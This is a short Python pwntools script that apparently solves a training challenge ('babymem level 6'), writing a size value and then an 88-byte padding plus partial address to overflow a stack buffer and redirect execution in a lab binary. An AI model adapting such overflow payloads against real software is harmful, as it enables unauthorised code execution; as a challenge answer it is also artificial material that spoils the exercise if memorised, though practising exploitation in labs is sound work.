import pwn
with open("output.txt","w") as f:
    r = pwn.process("/challenge/babymem_level6.0", stdout=f)
    r.sendline("1024")
    r.send(b'\x00'*88+b'\x8e\x15\x40')
